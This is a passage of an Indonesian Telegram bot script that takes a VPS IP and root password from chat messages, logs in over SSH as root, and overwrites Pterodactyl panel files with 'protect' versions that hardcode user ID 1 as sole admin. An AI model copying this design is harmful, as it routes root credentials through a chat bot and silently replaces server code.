      return bot.sendMessage(chatId, "❌ Akses ditolak. Kamu bukan owner.");
  }

  // Validasi format ipvps|password
  if (!input.includes('|')) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect2 ipvps|password`', { parse_mode: 'Markdown' });
  }

  const [ipvps, password] = input.split('|').map(i => i.trim());
  if (!ipvps || !password) {
    return bot.sendMessage(chatId, '❌ Salah format!\nGunakan seperti ini:\n`/uninstallprotect2 ipvps|password`', { parse_mode: 'Markdown' });
  }

  const filePath =
    "/var/www/pterodactyl/app/Http/Controllers/Api/Client/Servers/ServerController.php";

  // Kode PHP original sebelum Protect8
  const phpCode = `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client\\Servers;

use Pterodactyl\\Models\\Server;
use Pterodactyl\\Transformers\\Api\\Client\\ServerTransformer;
use Pterodactyl\\Services\\Servers\\GetUserPermissionsService;
use Pterodactyl\\Http\\Controllers\\Api\\Client\\ClientApiController;
use Pterodactyl\\Http\\Requests\\Api\\Client\\Servers\\GetServerRequest;

class ServerController extends ClientApiController
{
    /**
     * ServerController constructor.
     */
    public function __construct(private GetUserPermissionsService $permissionsService)
    {
        parent::__construct();
    }

    /**
     * Transform an individual server into a response that can be consumed by a
     * client using the API.
     */
    public function index(GetServerRequest $request, Server $server): array
    {
        return $this->fractal->item($server)
            ->transformWith($this->getTransformer(ServerTransformer::class))
            ->addMeta([
                'is_server_owner' => $request->user()->id === $server->owner_id,
                'user_permissions' => $this->permissionsService->handle($server, $request->user()),
            ])
            ->toArray();
    }
}`.trim();

  try {
    await ssh.connect({
      host: ipvps,
      username: 'root',
      password: password,
      port: 22,
    });

    const tempFile = path.join(__dirname, "ServerController.php");
    fs.writeFileSync(tempFile, phpCode);

    await ssh.putFile(tempFile, filePath);
    fs.unlinkSync(tempFile);

    await bot.sendMessage(
      chatId,
      `🛡️ *PROTECT2 (ANTI INTIP SERVER) BERHASIL DIHAPUS!*

📂 *Lokasi File:*  
\`${filePath}\`

©Protect By @Pirzyy1`,
      { parse_mode: "Markdown" }
    );

    ssh.dispose();
    console.log(`🔴 Protect2 dihapus untuk owner ${userId} di VPS ${ipvps}`);
  } catch (err) {
    console.error("❌ ERROR UNINSTALLPROTECT2:", err);
    bot.sendMessage(
      chatId,
      `❌ Gagal menghapus PROTECT2.\n\nError:\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  }
});
// PASANG / UN PROTECTALL
bot.onText(/^\/installprotectall (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = match[1];
  const senderId = msg.from.id;

  const { NodeSSH } = require("node-ssh");
  const fs = require("fs");
  const path = require("path");
  const ssh = new NodeSSH();

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }

  // Validasi format
  if (!input.includes("|")) {
    return bot.sendMessage(
      chatId,
      "❌ Salah format!\nGunakan:\n`/installprotectall ipvps|password`",
      { parse_mode: "Markdown" }
    );
  }

  const [host, password] = input.split("|");

  await bot.sendMessage(
    chatId,
    "🧩 *Memulai instalasi semua proteksi...*\nHarap tunggu ⏳",
    { parse_mode: "Markdown" }
  );

  try {
    await ssh.connect({
      host: host.trim(),
      username: "root",
      password: password.trim(),
      port: 22,
      readyTimeout: 20000,
    });

    // ========================= PATHS =========================
    const protectFiles = [
      {
        name: "PROTECT1 (Anti Intip Server In Settings)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ServerController.php",
        file: "ServerController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Servers;

use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Models\\User;
use Pterodactyl\\Models\\Nest;
use Pterodactyl\\Models\\Location;
use Spatie\\QueryBuilder\\QueryBuilder;
use Spatie\\QueryBuilder\\AllowedFilter;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Models\\Filters\\AdminServerFilter;
use Illuminate\\Contracts\\View\\Factory as ViewFactory;

class ServerController extends Controller
{
    /**
     * Konstruktor
     */
    public function __construct(private ViewFactory $view)
    {
    }

/**
 * 📋 Daftar server — hanya tampilkan milik sendiri kecuali admin ID 1
 */
public function index(Request $request): View
{
    $user = Auth::user();

    // Ambil query dasar
$query = Server::query()
    ->with(['node', 'user', 'allocation'])
    ->orderBy('id', 'asc'); // server baru di bawah

    // pirzyProtect  v1.5 — Batasi query utama
    if ($user->id !== 1) {
        $query->where('owner_id', $user->id);
    }

    // Gunakan QueryBuilder tapi tetap batasi hasil user
    $servers = QueryBuilder::for($query)
        ->allowedFilters([
            AllowedFilter::exact('owner_id'),
            AllowedFilter::custom('*', new AdminServerFilter()),
        ])
        ->when($request->has('filter') && isset($request->filter['search']), function ($q) use ($request) {
            $search = $request->filter['search'];
            $q->where(function ($sub) use ($search) {
                $sub->where('name', 'like', "%{$search}%")
                    ->orWhere('uuidShort', 'like', "%{$search}%")
                    ->orWhere('uuid', 'like', "%{$search}%");
            });
        })
        ->paginate(config('pterodactyl.paginate.admin.servers'))
        ->appends($request->query());

    return $this->view->make('admin.servers.index', ['servers' => $servers]);
}

    /**
     * 🧱 Form buat server baru
     */
    public function create(): View
    {
        $user = Auth::user();

        if ($user->id === 1) {
            // Admin ID 1 bisa pilih owner siapa pun
            $users = User::all();
            $lock_owner = false;
            $auto_owner = null;
        } else {
            // User biasa hanya bisa membuat server untuk dirinya sendiri
            $users = collect([$user]);
            $lock_owner = true;
            $auto_owner = $user;
        }

        return $this->view->make('admin.servers.new', [
            'users' => $users,
            'lock_owner' => $lock_owner,
            'auto_owner' => $auto_owner,
            'locations' => Location::with('nodes')->get(),
            'nests' => Nest::with('eggs')->get(),
        ]);
    }

    /**
     * 🔍 Detail/Edit Server — hanya pemilik server atau admin ID 1
     */
    public function view(Server $server): View
    {
        $user = Auth::user();

        if ($user->id !== 1 && $server->owner_id !== $user->id) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat melihat atau mengedit server ini! ©Protect By @Pirzyy1.');
        }

        return $this->view->make('admin.servers.view', ['server' => $server]);
    }

    /**
     * 🛠 Update Server — hanya pemilik server atau admin ID 1
     */
    public function update(Request $request, Server $server)
    {
        $user = Auth::user();

        if ($user->id !== 1 && $server->owner_id !== $user->id) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat mengubah server ini! ©Protect By @Pirzyy1.');
        }

        // Lindungi agar user biasa tidak bisa ubah owner_id
        $data = $request->except(['owner_id']);

        $server->update($data);

        return redirect()->route('admin.servers.view', $server->id)
            ->with('success', '✅ Server berhasil diperbarui.');
    }

    /**
     * ❌ Hapus Server — hanya Admin ID 1
     */
    public function destroy(Server $server)
    {
        $user = Auth::user();

        if ($user->id !== 1) {
            abort(403, '🚫 Akses ditolak: Hanya admin ID 1 yang dapat menghapus server ini! ©Protect By @Pirzyy1.');
        }

        $server->delete();

        return redirect()->route('admin.servers')
            ->with('success', '🗑️ Server berhasil dihapus.');
    }
}`
      },
      {
        name: "PROTECT1 (Otomatis Isi Server Owner)",
        path: "/var/www/pterodactyl/resources/views/admin/servers/new.blade.php",
        file: "new.blade.php",
        code: `@extends('layouts.admin')

@section('title')
    New Server
@endsection

@section('content-header')
    <h1>Create Server<small>Add a new server to the panel.</small></h1>
    <ol class="breadcrumb">
        <li><a href="{{ route('admin.index') }}">Admin</a></li>
        <li><a href="{{ route('admin.servers') }}">Servers</a></li>
        <li class="active">Create Server</li>
    </ol>
@endsection

@section('content')
<form action="{{ route('admin.servers.new') }}" method="POST">
    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Core Details</h3>
                </div>

                <div class="box-body row">
                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="pName">Server Name</label>
                            <input type="text" class="form-control" id="pName" name="name" value="{{ old('name') }}" placeholder="Server Name">
                            <p class="small text-muted no-margin">Character limits: <code>a-z A-Z 0-9 _ - .</code> and <code>[Space]</code>.</p>
                        </div>

<div class="form-group">
    <label for="pUserId">Server Owner</label>

    @if(Auth::user()->id == 1)
        {{-- Admin ID 1: bisa isi manual --}}
        <select id="pUserId" name="owner_id" class="form-control">
            <option value="">Select a User</option>
            @foreach(\\Pterodactyl\\Models\\User::all() as $user)
                <option value="{{ $user->id }}" @selected(old('owner_id') == $user->id)>
                    {{ $user->username }} ({{ $user->email }})
                </option>
            @endforeach
        </select>
        <p class="small text-muted no-margin">As admin, you can manually choose the server owner.</p>
    @else
        {{-- Selain admin ID 1: otomatis --}}
        <input type="hidden" id="pUserId" name="owner_id" value="{{ Auth::user()->id }}">
        <input type="text" class="form-control" value="{{ Auth::user()->email }}" disabled>
        <p class="small text-muted no-margin">This server will be owned by your account automatically.</p>
    @endif
</div>
                    </div>

                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="pDescription" class="control-label">Server Description</label>
                            <textarea id="pDescription" name="description" rows="3" class="form-control">{{ old('description') }}</textarea>
                            <p class="text-muted small">A brief description of this server.</p>
                        </div>

                        <div class="form-group">
                            <div class="checkbox checkbox-primary no-margin-bottom">
                                <input id="pStartOnCreation" name="start_on_completion" type="checkbox" {{ \\Pterodactyl\\Helpers\\Utilities::checked('start_on_completion', 1) }} />
                                <label for="pStartOnCreation" class="strong">Start Server when Installed</label>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="overlay" id="allocationLoader" style="display:none;"><i class="fa fa-refresh fa-spin"></i></div>
                <div class="box-header with-border">
                    <h3 class="box-title">Allocation Management</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-sm-4">
                        <label for="pNodeId">Node</label>
                        <select name="node_id" id="pNodeId" class="form-control">
                            @foreach($locations as $location)
                                <optgroup label="{{ $location->long }} ({{ $location->short }})">
                                @foreach($location->nodes as $node)

                                <option value="{{ $node->id }}"
                                    @if($location->id === old('location_id')) selected @endif
                                >{{ $node->name }}</option>

                                @endforeach
                                </optgroup>
                            @endforeach
                        </select>

                        <p class="small text-muted no-margin">The node which this server will be deployed to.</p>
                    </div>

                    <div class="form-group col-sm-4">
                        <label for="pAllocation">Default Allocation</label>
                        <select id="pAllocation" name="allocation_id" class="form-control"></select>
                        <p class="small text-muted no-margin">The main allocation that will be assigned to this server.</p>
                    </div>

                    <div class="form-group col-sm-4">
                        <label for="pAllocationAdditional">Additional Allocation(s)</label>
                        <select id="pAllocationAdditional" name="allocation_additional[]" class="form-control" multiple></select>
                        <p class="small text-muted no-margin">Additional allocations to assign to this server on creation.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="overlay" id="allocationLoader" style="display:none;"><i class="fa fa-refresh fa-spin"></i></div>
                <div class="box-header with-border">
                    <h3 class="box-title">Application Feature Limits</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pDatabaseLimit" class="control-label">Database Limit</label>
                        <div>
                            <input type="text" id="pDatabaseLimit" name="database_limit" class="form-control" value="{{ old('database_limit', 0) }}"/>
                        </div>
                        <p class="text-muted small">The total number of databases a user is allowed to create for this server.</p>
                    </div>
                    <div class="form-group col-xs-6">
                        <label for="pAllocationLimit" class="control-label">Allocation Limit</label>
                        <div>
                            <input type="text" id="pAllocationLimit" name="allocation_limit" class="form-control" value="{{ old('allocation_limit', 0) }}"/>
                        </div>
                        <p class="text-muted small">The total number of allocations a user is allowed to create for this server.</p>
                    </div>
                    <div class="form-group col-xs-6">
                        <label for="pBackupLimit" class="control-label">Backup Limit</label>
                        <div>
                            <input type="text" id="pBackupLimit" name="backup_limit" class="form-control" value="{{ old('backup_limit', 0) }}"/>
                        </div>
                        <p class="text-muted small">The total number of backups that can be created for this server.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-xs-12">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Resource Management</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pCPU">CPU Limit</label>

                        <div class="input-group">
                            <input type="text" id="pCPU" name="cpu" class="form-control" value="{{ old('cpu', 0) }}" />
                            <span class="input-group-addon">%</span>
                        </div>

                        <p class="text-muted small">If you do not want to limit CPU usage, set the value to <code>0</code>. To determine a value, take the number of threads and multiply it by 100. For example, on a quad core system without hyperthreading <code>(4 * 100 = 400)</code> there is <code>400%</code> available. To limit a server to using half of a single thread, you would set the value to <code>50</code>. To allow a server to use up to two threads, set the value to <code>200</code>.<p>
                    </div>

                    <div class="form-group col-xs-6">
                        <label for="pThreads">CPU Pinning</label>

                        <div>
                            <input type="text" id="pThreads" name="threads" class="form-control" value="{{ old('threads') }}" />
                        </div>

                        <p class="text-muted small"><strong>Advanced:</strong> Enter the specific CPU threads that this process can run on, or leave blank to allow all threads. This can be a single number, or a comma separated list. Example: <code>0</code>, <code>0-1,3</code>, or <code>0,1,3,4</code>.</p>
                    </div>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pMemory">Memory</label>

                        <div class="input-group">
                            <input type="text" id="pMemory" name="memory" class="form-control" value="{{ old('memory') }}" />
                            <span class="input-group-addon">MiB</span>
                        </div>

                        <p class="text-muted small">The maximum amount of memory allowed for this container. Setting this to <code>0</code> will allow unlimited memory in a container.</p>
                    </div>

                    <div class="form-group col-xs-6">
                        <label for="pSwap">Swap</label>

                        <div class="input-group">
                            <input type="text" id="pSwap" name="swap" class="form-control" value="{{ old('swap', 0) }}" />
                            <span class="input-group-addon">MiB</span>
                        </div>

                        <p class="text-muted small">Setting this to <code>0</code> will disable swap space on this server. Setting to <code>-1</code> will allow unlimited swap.</p>
                    </div>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-6">
                        <label for="pDisk">Disk Space</label>

                        <div class="input-group">
                            <input type="text" id="pDisk" name="disk" class="form-control" value="{{ old('disk') }}" />
                            <span class="input-group-addon">MiB</span>
                        </div>

                        <p class="text-muted small">This server will not be allowed to boot if it is using more than this amount of space. If a server goes over this limit while running it will be safely stopped and locked until enough space is available. Set to <code>0</code> to allow unlimited disk usage.</p>
                    </div>

                    <div class="form-group col-xs-6">
                        <label for="pIO">Block IO Weight</label>

                        <div>
                            <input type="text" id="pIO" name="io" class="form-control" value="{{ old('io', 500) }}" />
                        </div>

                        <p class="text-muted small"><strong>Advanced</strong>: The IO performance of this server relative to other <em>running</em> containers on the system. Value should be between <code>10</code> and <code>1000</code>. Please see <a href="https://docs.docker.com/engine/reference/run/#block-io-bandwidth-blkio-constraint" target="_blank">this documentation</a> for more information about it.</p>
                    </div>
                    <div class="form-group col-xs-12">
                        <div class="checkbox checkbox-primary no-margin-bottom">
                            <input type="checkbox" id="pOomDisabled" name="oom_disabled" value="0" {{ \\Pterodactyl\\Helpers\\Utilities::checked('oom_disabled', 0) }} />
                            <label for="pOomDisabled" class="strong">Enable OOM Killer</label>
                        </div>

                        <p class="small text-muted no-margin">Terminates the server if it breaches the memory limits. Enabling OOM killer may cause server processes to exit unexpectedly.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-md-6">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Nest Configuration</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-12">
                        <label for="pNestId">Nest</label>

                        <select id="pNestId" name="nest_id" class="form-control">
                            @foreach($nests as $nest)
                                <option value="{{ $nest->id }}"
                                    @if($nest->id === old('nest_id'))
                                        selected="selected"
                                    @endif
                                >{{ $nest->name }}</option>
                            @endforeach
                        </select>

                        <p class="small text-muted no-margin">Select the Nest that this server will be grouped under.</p>
                    </div>

                    <div class="form-group col-xs-12">
                        <label for="pEggId">Egg</label>
                        <select id="pEggId" name="egg_id" class="form-control"></select>
                        <p class="small text-muted no-margin">Select the Egg that will define how this server should operate.</p>
                    </div>
                    <div class="form-group col-xs-12">
                        <div class="checkbox checkbox-primary no-margin-bottom">
                            <input type="checkbox" id="pSkipScripting" name="skip_scripts" value="1" {{ \\Pterodactyl\\Helpers\\Utilities::checked('skip_scripts', 0) }} />
                            <label for="pSkipScripting" class="strong">Skip Egg Install Script</label>
                        </div>

                        <p class="small text-muted no-margin">If the selected Egg has an install script attached to it, the script will run during the install. If you would like to skip this step, check this box.</p>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-md-6">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Docker Configuration</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-12">
                        <label for="pDefaultContainer">Docker Image</label>
                        <select id="pDefaultContainer" name="image" class="form-control"></select>
                        <input id="pDefaultContainerCustom" name="custom_image" value="{{ old('custom_image') }}" class="form-control" placeholder="Or enter a custom image..." style="margin-top:1rem"/>
                        <p class="small text-muted no-margin">This is the default Docker image that will be used to run this server. Select an image from the dropdown above, or enter a custom image in the text field above.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-md-12">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Startup Configuration</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-12">
                        <label for="pStartup">Startup Command</label>
                        <input type="text" id="pStartup" name="startup" value="{{ old('startup') }}" class="form-control" />
                        <p class="small text-muted no-margin">The following data substitutes are available for the startup command: <code>@{{SERVER_MEMORY}}</code>, <code>@{{SERVER_IP}}</code>, and <code>@{{SERVER_PORT}}</code>. They will be replaced with the allocated memory, server IP, and server port respectively.</p>
                    </div>
                </div>

                <div class="box-header with-border" style="margin-top:-10px;">
                    <h3 class="box-title">Service Variables</h3>
                </div>

                <div class="box-body row" id="appendVariablesTo"></div>

                <div class="box-footer">
                    {!! csrf_field() !!}
                    <input type="submit" class="btn btn-success pull-right" value="Create Server" />
                </div>
            </div>
        </div>
    </div>
</form>
@endsection

@section('footer-scripts')
    @parent
    {!! Theme::js('vendor/lodash/lodash.js') !!}

    <script type="application/javascript">
        // Persist 'Service Variables'
        function serviceVariablesUpdated(eggId, ids) {
            @if (old('egg_id'))
                // Check if the egg id matches.
                if (eggId != '{{ old('egg_id') }}') {
                    return;
                }

                @if (old('environment'))
                    @foreach (old('environment') as $key => $value)
                        $('#' + ids['{{ $key }}']).val('{{ $value }}');
                    @endforeach
                @endif
            @endif
            @if(old('image'))
                $('#pDefaultContainer').val('{{ old('image') }}');
            @endif
        }
        // END Persist 'Service Variables'
    </script>

    {!! Theme::js('js/admin/new-server.js?v=20220530') !!}

    <script type="application/javascript">
        $(document).ready(function() {
// Persist 'Server Owner' select2
// (Removed because Server Owner now auto-fills based on logged-in user)
// END Persist 'Server Owner' select2

            // Persist 'Node' select2
            @if (old('node_id'))
                $('#pNodeId').val('{{ old('node_id') }}').change();

                // Persist 'Default Allocation' select2
                @if (old('allocation_id'))
                    $('#pAllocation').val('{{ old('allocation_id') }}').change();
                @endif
                // END Persist 'Default Allocation' select2

                // Persist 'Additional Allocations' select2
                @if (old('allocation_additional'))
                    const additional_allocations = [];

                    @for ($i = 0; $i < count(old('allocation_additional')); $i++)
                        additional_allocations.push('{{ old('allocation_additional.'.$i)}}');
                    @endfor

                    $('#pAllocationAdditional').val(additional_allocations).change();
                @endif
                // END Persist 'Additional Allocations' select2
            @endif
            // END Persist 'Node' select2

            // Persist 'Nest' select2
            @if (old('nest_id'))
                $('#pNestId').val('{{ old('nest_id') }}').change();

                // Persist 'Egg' select2
                @if (old('egg_id'))
                    $('#pEggId').val('{{ old('egg_id') }}').change();
                @endif
                // END Persist 'Egg' select2
            @endif
            // END Persist 'Nest' select2
        });
    </script>
@endsection
`
      },
      {
        name: "PROTECT1 (Anti Update Detail Server)",
        path: "/var/www/pterodactyl/app/Services/Servers/DetailsModificationService.php",
        file: "DetailsModificationService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Servers;

use Illuminate\\Support\\Arr;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Models\\Server;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Traits\\Services\\ReturnsUpdatedModels;
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException;

class DetailsModificationService
{
    use ReturnsUpdatedModels;

    public function __construct(
        private ConnectionInterface $connection,
        private DaemonServerRepository $serverRepository
    ) {
    }

    /**
     * 🧱 pirzyProtect  v1.1 — Anti Edit Server
     * Mencegah user non-admin mengubah detail server milik orang lain.
     */
    public function handle(Server $server, array $data): Server
    {
        $user = Auth::user();

        // Proteksi: hanya Admin ID 1 boleh ubah detail server orang lain
        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id ?? $server->user_id ?? null;

            if ($ownerId !== $user->id) {
                throw new DisplayException(
                    '🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mengubah detail server milik orang lain! ©Protect By @Pirzyy1'
                );
            }
        }

        // Jalankan proses bawaan
        return $this->connection->transaction(function () use ($data, $server) {
            $owner = $server->owner_id;

            $server->forceFill([
                'external_id' => Arr::get($data, 'external_id'),
                'owner_id' => Arr::get($data, 'owner_id'),
                'name' => Arr::get($data, 'name'),
                'description' => Arr::get($data, 'description') ?? '',
            ])->saveOrFail();

            // Jika owner diganti, cabut akses owner lama di Wings
            if ($server->owner_id !== $owner) {
                try {
                    $this->serverRepository->setServer($server)->revokeUserJTI($owner);
                } catch (DaemonConnectionException $exception) {
                    // Abaikan error jika Wings sedang offline
                }
            }

            return $server;
        });
    }
}`
      },
      {
        name: "PROTECT1 (Anti Update Build Configuration Server)",
        path: "/var/www/pterodactyl/app/Services/Servers/BuildModificationService.php",
        file: "BuildModificationService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Servers;

use Illuminate\\Support\\Arr;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Models\\Allocation;
use Illuminate\\Support\\Facades\\Log;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Exceptions\\DisplayException;
use Illuminate\\Support\\Facades\\Auth;
use Illuminate\\Database\\Eloquent\\ModelNotFoundException;
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;
use Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException;

class BuildModificationService
{
    public function __construct(
        private ConnectionInterface $connection,
        private DaemonServerRepository $daemonServerRepository,
        private ServerConfigurationStructureService $structureService
    ) {
    }

    /**
     * 🧱 pirzyProtect  v1.1 — Anti Build Abuse
     * Mencegah user non-admin mengubah konfigurasi Build server milik orang lain.
     *
     * @throws \\Throwable
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     */
    public function handle(Server $server, array $data): Server
    {
        $user = Auth::user();

        // pirzyProtect  — Cegah user biasa ubah konfigurasi server yang bukan miliknya
        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id ?? $server->user_id ?? null;

            if ($ownerId !== $user->id) {
                throw new DisplayException(
                    '🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mengubah Build Configuration server orang lain! ©Protect By @Pirzyy1'
                );
            }
        }

        // Jalankan proses asli (tetap sama dengan bawaan Pterodactyl)
        /** @var \\Pterodactyl\\Models\\Server $server */
        $server = $this->connection->transaction(function () use ($server, $data) {
            $this->processAllocations($server, $data);

            if (isset($data['allocation_id']) && $data['allocation_id'] != $server->allocation_id) {
                try {
                    Allocation::query()
                        ->where('id', $data['allocation_id'])
                        ->where('server_id', $server->id)
                        ->firstOrFail();
                } catch (ModelNotFoundException) {
                    throw new DisplayException('The requested default allocation is not currently assigned to this server.');
                }
            }

            $merge = Arr::only($data, [
                'oom_disabled',
                'memory',
                'swap',
                'io',
                'cpu',
                'threads',
                'disk',
                'allocation_id',
            ]);

            $server->forceFill(array_merge($merge, [
                'database_limit' => Arr::get($data, 'database_limit', 0) ?? null,
                'allocation_limit' => Arr::get($data, 'allocation_limit', 0) ?? null,
                'backup_limit' => Arr::get($data, 'backup_limit', 0) ?? 0,
            ]))->saveOrFail();

            return $server->refresh();
        });

        $updateData = $this->structureService->handle($server);

        if (!empty($updateData['build'])) {
            try {
                $this->daemonServerRepository->setServer($server)->sync();
            } catch (DaemonConnectionException $exception) {
                Log::warning($exception, ['server_id' => $server->id]);
            }
        }

        return $server;
    }

    /**
     * Proses alokasi (port) untuk server.
     */
    private function processAllocations(Server $server, array &$data): void
    {
        if (empty($data['add_allocations']) && empty($data['remove_allocations'])) {
            return;
        }

        if (!empty($data['add_allocations'])) {
            $query = Allocation::query()
                ->where('node_id', $server->node_id)
                ->whereIn('id', $data['add_allocations'])
                ->whereNull('server_id');

            $freshlyAllocated = $query->pluck('id')->first();

            $query->update(['server_id' => $server->id, 'notes' => null]);
        }

        if (!empty($data['remove_allocations'])) {
            foreach ($data['remove_allocations'] as $allocation) {
                if ($allocation === ($data['allocation_id'] ?? $server->allocation_id)) {
                    if (empty($freshlyAllocated)) {
                        throw new DisplayException(
                            'You are attempting to delete the default allocation for this server but there is no fallback allocation to use.'
                        );
                    }
                    $data['allocation_id'] = $freshlyAllocated;
                }
            }

            Allocation::query()
                ->where('node_id', $server->node_id)
                ->where('server_id', $server->id)
                ->whereIn('id', array_diff($data['remove_allocations'], $data['add_allocations'] ?? []))
                ->update([
                    'notes' => null,
                    'server_id' => null,
                ]);
        }
    }
}`
      },
      {
        name: "PROTECT1 (Anti Setup Server)",
        path: "/var/www/pterodactyl/app/Services/Servers/StartupModificationService.php",
        file: "StartupModificationService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Servers;

use Illuminate\\Support\\Arr;
use Pterodactyl\\Models\\Egg;
use Pterodactyl\\Models\\User;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Models\\ServerVariable;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Traits\\Services\\HasUserLevels;
use Pterodactyl\\Exceptions\\DisplayException;

class StartupModificationService
{
    use HasUserLevels;

    /**
     * StartupModificationService constructor.
     */
    public function __construct(
        private ConnectionInterface $connection,
        private VariableValidatorService $validatorService
    ) {
    }

    /**
     * 🧱 pirzyProtect  v1.1 — Anti Startup Abuse
     * Mencegah user non-admin mengubah startup command server milik orang lain.
     *
     * @throws \\Throwable
     */
    public function handle(Server $server, array $data): Server
    {
        // pirzyProtect  — Cegah user biasa ubah startup server bukan miliknya
        $user = auth()->user();

        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id ?? $server->user_id ?? null;

            if ($ownerId !== $user->id) {
                throw new DisplayException(
                    '🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mengubah startup command server orang lain! ©Protect By @Pirzyy1'
                );
            }
        }

        // Lanjut proses normal jika lolos verifikasi
        return $this->connection->transaction(function () use ($server, $data) {
            if (!empty($data['environment'])) {
                $egg = $this->isUserLevel(User::USER_LEVEL_ADMIN)
                    ? ($data['egg_id'] ?? $server->egg_id)
                    : $server->egg_id;

                $results = $this->validatorService
                    ->setUserLevel($this->getUserLevel())
                    ->handle($egg, $data['environment']);

                foreach ($results as $result) {
                    ServerVariable::query()->updateOrCreate(
                        [
                            'server_id' => $server->id,
                            'variable_id' => $result->id,
                        ],
                        ['variable_value' => $result->value ?? '']
                    );
                }
            }

            if ($this->isUserLevel(User::USER_LEVEL_ADMIN)) {
                $this->updateAdministrativeSettings($data, $server);
            }

            return $server->fresh();
        });
    }

    /**
     * Update certain administrative settings for a server in the DB.
     */
    protected function updateAdministrativeSettings(array $data, Server &$server): void
    {
        $eggId = Arr::get($data, 'egg_id');

        if (is_digit($eggId) && $server->egg_id !== (int) $eggId) {
            /** @var \\Pterodactyl\\Models\\Egg $egg */
            $egg = Egg::query()->findOrFail($data['egg_id']);

            $server = $server->forceFill([
                'egg_id' => $egg->id,
                'nest_id' => $egg->nest_id,
            ]);
        }

        $server->fill([
            'startup' => $data['startup'] ?? $server->startup,
            'skip_scripts' => $data['skip_scripts'] ?? isset($data['skip_scripts']),
            'image' => $data['docker_image'] ?? $server->image,
        ])->save();
    }
}`
      },
      {
        name: "PROTECT1 (Anti Update Database)",
        path: "/var/www/pterodactyl/app/Services/Databases/DatabaseManagementService.php",
        file: "DatabaseManagementService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Databases;

use Exception;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Models\\Database;
use Pterodactyl\\Helpers\\Utilities;
use Illuminate\\Database\\ConnectionInterface;
use Illuminate\\Contracts\\Encryption\\Encrypter;
use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Extensions\\DynamicDatabaseConnection;
use Pterodactyl\\Repositories\\Eloquent\\DatabaseRepository;
use Pterodactyl\\Exceptions\\Repository\\DuplicateDatabaseNameException;
use Pterodactyl\\Exceptions\\Service\\Database\\TooManyDatabasesException;
use Pterodactyl\\Exceptions\\Service\\Database\\DatabaseClientFeatureNotEnabledException;
use Pterodactyl\\Exceptions\\DisplayException;
use Illuminate\\Support\\Facades\\Log;

class DatabaseManagementService
{
    private const MATCH_NAME_REGEX = '/^(s[\\d]+_)(.*)$/';

    protected bool $validateDatabaseLimit = true;

    public function __construct(
        protected ConnectionInterface $connection,
        protected DynamicDatabaseConnection $dynamic,
        protected Encrypter $encrypter,
        protected DatabaseRepository $repository
    ) {
    }

    public static function generateUniqueDatabaseName(string $name, int $serverId): string
    {
        return sprintf('s%d_%s', $serverId, substr($name, 0, 48 - strlen("s{$serverId}_")));
    }

    public function setValidateDatabaseLimit(bool $validate): self
    {
        $this->validateDatabaseLimit = $validate;
        return $this;
    }

